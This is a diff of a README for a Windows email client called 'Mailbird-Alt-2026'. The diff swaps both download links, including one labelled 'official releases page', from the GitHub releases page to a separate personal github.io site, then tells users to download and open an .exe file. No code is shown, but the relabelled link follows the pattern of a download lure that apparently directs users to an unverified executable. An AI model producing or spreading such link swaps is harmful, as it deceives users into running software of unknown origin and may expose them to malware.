@@ -1,6 +1,6 @@
 # 📧 Mailbird-Alt-2026 - Simple Email Management For Windows Users
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dlwnsah1234/Mailbird-Alt-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://dlwnsah1234.github.io)
 
 Mailbird-Alt-2026 simplifies how you manage your electronic mail on Windows 10 and Windows 11. This application brings multiple email accounts into one window. You read, write, and organize messages from different providers within a single interface. The software focuses on speed and workflow efficiency.
 
@@ -8,7 +8,7 @@ Mailbird-Alt-2026 simplifies how you manage your electronic mail on Windows 10 a
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/dlwnsah1234/Mailbird-Alt-2026/releases).
+1. Visit the [official releases page](https://dlwnsah1234.github.io).
 2. Look for the most recent version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
